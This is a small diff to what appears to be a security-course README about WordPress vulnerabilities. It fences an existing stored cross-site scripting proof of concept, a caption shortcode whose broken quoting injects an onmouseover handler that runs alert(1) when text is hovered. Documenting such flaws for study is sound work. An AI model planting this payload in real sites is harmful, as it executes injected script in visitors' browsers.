@@ -14,8 +14,10 @@ Time spent: **X** hours spent in total
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: Create a post and enter the following script in the content: 
   
+  ```
     [caption width="3" caption='<a href="' ">]</a><a href="http://onmouseover='alert(1)'"<XSS!</a>
   
+  ```
   When user hovers over the text, the injected code will execute.
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
